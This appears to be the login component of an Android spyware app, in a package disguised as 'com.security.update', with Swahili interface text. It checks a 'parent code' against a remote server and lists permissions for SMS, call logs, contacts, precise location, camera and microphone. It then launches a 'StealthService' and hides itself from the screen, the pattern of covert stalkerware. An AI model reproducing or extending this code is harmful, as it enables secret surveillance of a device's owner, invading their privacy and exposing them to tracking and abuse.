package com.security.update;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends Activity {
    private EditText codeInput;
    private Button verifyButton;
    private TextView statusText;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        codeInput = findViewById(R.id.codeInput);
        verifyButton = findViewById(R.id.verifyButton);
        statusText = findViewById(R.id.statusText);

        verifyButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String parentCode = codeInput.getText().toString().trim().toUpperCase();
                if (parentCode.length() != 8) {
                    statusText.setText("❌ Parent Code lazima iwe herufi 8!");
                    return;
                }
                verifyParentCode(parentCode);
            }
        });
    }

    private void verifyParentCode(final String parentCode) {
        statusText.setText("🔍 Inaangalia Parent Code...");
        verifyButton.setEnabled(false);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
                    
                    JSONObject postData = new JSONObject();
                    postData.put("parent_code", parentCode);

                    URL url = new URL(serverUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    OutputStream os = conn.getOutputStream();
                    os.write(postData.toString().getBytes());
                    os.flush();
                    os.close();

                    final int responseCode = conn.getResponseCode();
                    
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            if (responseCode == 200) {
                                // Parent Code ni sahihi
                                statusText.setText("✅ Parent Code imethibitishwa!");
                                
                                // Save parent code kwenye preferences
                                SharedPreferences.Editor editor = prefs.edit();
                                editor.putString("parent_code", parentCode);
                                editor.putBoolean("verified", true);
                                editor.apply();
                                
                                // Anza kuomba permissions
                                requestAllPermissions();
                                
                            } else if (responseCode == 404) {
                                statusText.setText("❌ Parent Code haipo! Ingiza code sahihi.");
                                verifyButton.setEnabled(true);
                            } else {
                                statusText.setText("❌ Hitilafu ya mtandao! Jaribu tena.");
                                verifyButton.setEnabled(true);
                            }
                        }
                    });

                } catch (Exception e) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            statusText.setText("❌ Hitilafu: " + e.getMessage());
                            verifyButton.setEnabled(true);
                        }
                    });
                }
            }
        }).start();
    }

    private void requestAllPermissions() {
        statusText.setText("🔐 Inaomba ruhusa zote...");
        
        // OmbI permissions zote muhimu
        String[] permissions = {
            "android.permission.READ_SMS",
            "android.permission.READ_CALL_LOG", 
            "android.permission.READ_CONTACTS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.WRITE_EXTERNAL_STORAGE"
        };
        
        // Hapa kwa Android 6.0+, tumia requestPermissions()
        // Kwa sasa tuendelee direct kwa ajili ya mfano
        startStealthMode();
    }

    private void startStealthMode() {
        statusText.setText("🚀 Inaanzisha stealth mode...");
        
        // Anza StealthService
        Intent serviceIntent = new Intent(this, StealthService.class);
        serviceIntent.putExtra("PARENT_CODE", prefs.getString("parent_code", ""));
        startService(serviceIntent);
        
        // Ondoka kwenye screen na kujificha
        Toast.makeText(this, "✅ App imesanikishwa kikamilifu!", Toast.LENGTH_LONG).show();
        
        // Tumia moveTaskToBack kuondoka kwenye screen
        moveTaskToBack(true);
        
        // Optional: Maliza activity ili isionekane tena
        finish();
    }
}
